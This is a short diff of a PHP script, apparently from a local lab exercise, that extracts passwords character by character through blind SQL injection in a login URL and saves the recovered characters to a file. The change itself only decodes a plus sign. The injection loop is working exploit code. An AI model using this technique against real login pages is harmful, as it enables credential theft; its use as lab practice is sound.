@@ -101,7 +101,9 @@ for($id = 1; $id <= 100; $id++){
 			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(password,$i,1)%20=%20%27$letter%27%20--%20";
 			$result = file_get_contents($url);
 			if (strpos($result, 'cat') !== false) {
-
+				if ($letter == "%2B") {
+					$letter = "+";
+				}
 				print "$letter";
 				fputs($monfichier, $letter);
 				break;
